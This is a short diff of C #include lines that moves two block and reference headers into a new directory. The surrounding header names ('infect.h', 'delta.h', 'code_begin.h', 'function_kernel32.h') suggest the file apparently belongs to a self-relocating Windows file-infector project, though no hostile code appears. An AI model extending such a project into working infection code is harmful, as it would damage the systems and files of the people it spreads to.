@@ -1,11 +1,11 @@
 #include <stdio.h>
 
+#include "block/block.h"
+#include "block/reference.h"
 #include "checksum.h"
 #include "code_begin.h"
 #include "code_end.h"
 #include "delta.h"
-#include "disasm/analysis/block.h"
-#include "disasm/analysis/reference.h"
 #include "disasm/disasm.h"
 #include "function_kernel32.h"
 #include "infect.h"
